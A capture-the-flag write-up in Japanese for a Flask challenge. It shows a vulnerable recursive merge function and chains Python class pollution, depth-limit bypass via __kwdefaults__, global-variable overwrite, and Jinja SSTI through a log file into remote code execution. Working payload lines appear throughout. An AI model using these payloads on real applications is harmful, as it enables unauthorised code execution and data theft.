# Personal Website

## 問題文

I heard my website isn't secure. I made it persistent by using a database so that I can recover it if something goes wrong.

## Writeup

### 解法1

脆弱性は以下の箇所にある。

```python
def merge_info(src, user, *, depth=0):
    if depth > 3:
        raise Exception("Reached maximum depth")
    for k, v in src.items():
        if hasattr(user, "__getitem__"):
            if user.get(k) and type(v) == dict:
                User.merge_info(v, user.get(k),depth=depth+1)
            else:
                user[k] = v
        elif hasattr(user, k) and type(v) == dict:
            User.merge_info(v, getattr(user, k),depth=depth+1)
        else:
            setattr(user, k, v)
```

このような再帰的なmergeは、Pythonの[Class Pollution](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.html)攻撃が成立する。この攻撃では、

```python
obj.__class__.__qualname__  = "foobar"
```
のようにクラスのメタ情報を変更したり、

```python
obj.__class__.__init__.__globals__["GLOBAL_VAR"] = "bizbaz"
```
のようにグローバル変数を変更することが可能な攻撃である。

ただし、深さ制限があるため、このままではできることが限られている。そこで、

```python
user.__class__.merge_info.__kwdefaults__["depth"] = -9999
```
のように`depth`が指定されなかった際の初期値を変え、深さ制限を実質無効化する。

これでグローバル変数を自由に変更できるようになる。`app.py`のグローバル変数は、

```python
user.__class__.__init__.__globals__["generate_password_hash"].__globals__["os"].sys.modules["app"].CONFIG_TEMPLATE
```
のようにアクセスできる。

これにより、テンプレートのパスを変更できるようになった。しかし、アプリケーションのディレクトリの外のファイルにアクセスすることはできない。幸い、`/app`ディレクトリには、`flask.log`というログファイルが生成されるため、もしこのファイルにFlaskのSSTIを含めることができれば、RCEが可能になる。

テンプレートのパスをSSTIのペイロードにすると、

```
jinja2.exceptions.TemplateNotFound: {{[].__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__['__import__']('os').popen('/readflag').read()}}
```

のようなエラーを出力させることを利用できる。これをテンプレートとして読み込むことでRCEが成功する。

### 解法2

深さ制限の無効化までは解法1と同様。Class Pollutionが可能であるという条件で、[Jinjaに任意コード実行につながるガジェット](https://www.offensiveweb.com/docs/programming/python/class-pollution/#rce)がある。したがって、これをスクリプトキディすることでも解くことができる。

## Flag

`fwectf{placeholder_<dynamic>}`



